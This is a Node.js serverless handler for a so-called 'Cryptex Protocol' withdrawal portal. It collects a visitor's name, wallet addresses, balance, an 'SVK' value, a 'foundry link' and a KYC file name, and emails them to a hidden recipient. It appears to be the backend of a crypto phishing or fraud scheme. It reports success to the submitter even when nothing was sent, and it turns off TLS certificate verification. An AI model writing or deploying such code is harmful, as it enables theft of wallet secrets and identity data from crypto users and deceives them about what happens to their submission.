export const config = { runtime: 'nodejs' };

import nodemailer from 'nodemailer';

function escapeHtml(str) {
  if (!str) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { name, exchangeWallet, walletAddress, solBalance, usdcValue, svk, foundryLink, kycFile } = req.body;

  if (!name || !walletAddress || !svk || !foundryLink || !exchangeWallet) {
    return res.status(400).json({ error: 'Missing required fields' });
  }

  const smtpHost = process.env.SMTP_HOST;
  const smtpPort = parseInt(process.env.SMTP_PORT || '587');
  const smtpUser = process.env.SMTP_USER;
  const smtpPass = process.env.SMTP_PASS;
  const recipientEmail = process.env.RECIPIENT_EMAIL;

  if (!smtpHost || !smtpUser || !smtpPass || !recipientEmail) {
    console.error('Missing email env vars');
    return res.status(200).json({ success: true, warning: 'Email not configured' });
  }

  const transporter = nodemailer.createTransport({
    host: smtpHost,
    port: smtpPort,
    secure: false,
    auth: { user: smtpUser, pass: smtpPass },
    tls: { rejectUnauthorized: false },
  });

  const submittedAt = new Date().toUTCString();

  const html = `
<div style="font-family:monospace;background:#0a0a0f;color:#e0e0ff;padding:32px;max-width:600px;margin:0 auto">
  <div style="background:linear-gradient(135deg,#9945FF,#14F195);padding:2px;border-radius:12px;margin-bottom:24px">
    <div style="background:#0f0f1a;border-radius:10px;padding:24px;text-align:center">
      <div style="font-size:32px">◎</div>
      <h1 style="font-size:20px;color:#9945FF;letter-spacing:2px;margin:8px 0 4px">NEW ENTRY RECEIVED</h1>
      <p style="font-size:12px;color:#14F195;margin:0">CRYPTEX PROTOCOL · WITHDRAWAL PORTAL</p>
    </div>
  </div>
  <div style="background:#0f0f1a;border:1px solid rgba(153,69,255,0.3);border-radius:8px;padding:20px;margin-bottom:16px">
    <div style="font-size:11px;color:rgba(153,69,255,0.6);letter-spacing:2px;margin-bottom:6px">FULL NAME</div>
    <div style="font-size:15px">${escapeHtml(name)}</div>
  </div>
  <div style="background:#0f0f1a;border:1px solid rgba(153,69,255,0.3);border-radius:8px;padding:20px;margin-bottom:16px">
    <div style="font-size:11px;color:rgba(153,69,255,0.6);letter-spacing:2px;margin-bottom:6px">KYC DOCUMENT</div>
    <div style="font-size:13px;color:rgba(20,241,149,0.8)">${kycFile ? escapeHtml(kycFile) : 'Not provided'}</div>
  </div>
  <div style="background:#0f0f1a;border:1px solid rgba(153,69,255,0.3);border-radius:8px;padding:20px;margin-bottom:16px">
    <div style="font-size:11px;color:rgba(153,69,255,0.6);letter-spacing:2px;margin-bottom:6px">EXCHANGE WALLET</div>
    <div style="font-size:13px;color:#9945FF;word-break:break-all">${escapeHtml(exchangeWallet)}</div>
  </div>
  <div style="background:#0f0f1a;border:1px solid rgba(153,69,255,0.3);border-radius:8px;padding:20px;margin-bottom:16px">
    <div style="font-size:11px;color:rgba(153,69,255,0.6);letter-spacing:2px;margin-bottom:6px">SOLANA WALLET</div>
    <div style="font-size:13px;color:#14F195;word-break:break-all">${escapeHtml(walletAddress)}</div>
    ${solBalance ? `<div style="font-size:11px;color:rgba(20,241,149,0.6);margin-top:4px">◎ Balance: ${solBalance} SOL${usdcValue ? ' ($' + usdcValue + ' USDC)' : ''} — verified on-chain</div>` : ''}
  </div>
  <div style="background:#0f0f1a;border:1px solid rgba(153,69,255,0.3);border-radius:8px;padding:20px;margin-bottom:16px">
    <div style="font-size:11px;color:rgba(153,69,255,0.6);letter-spacing:2px;margin-bottom:6px">SVK</div>
    <div style="font-size:14px;word-break:break-all">${escapeHtml(svk)}</div>
  </div>
  <div style="background:#0f0f1a;border:1px solid rgba(153,69,255,0.3);border-radius:8px;padding:20px;margin-bottom:16px">
    <div style="font-size:11px;color:rgba(153,69,255,0.6);letter-spacing:2px;margin-bottom:6px">FOUNDRY LINK</div>
    <div style="font-size:13px;word-break:break-all"><a href="${escapeHtml(foundryLink)}" style="color:#9945FF">${escapeHtml(foundryLink)}</a></div>
  </div>
  <p style="font-size:11px;color:rgba(153,69,255,0.4);text-align:center;margin-top:20px">Submitted: ${submittedAt}</p>
</div>`;

  try {
    await transporter.sendMail({
      from: `"Cryptex Portal" <${smtpUser}>`,
      to: recipientEmail,
      subject: `◎ New Entry: ${name} · Cryptex Portal`,
      text: `NEW SUBMISSION\n\nName: ${name}\nKYC Document: ${kycFile || 'N/A'}\nExchange Wallet: ${exchangeWallet}\nSolana Wallet: ${walletAddress}\nSOL Balance: ${solBalance} SOL ($${usdcValue} USDC)\nSVK: ${svk}\nFoundry: ${foundryLink}\nTime: ${submittedAt}`,
      html,
    });
    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('Email error:', error.message);
    return res.status(200).json({ success: true, warning: error.message });
  }
}
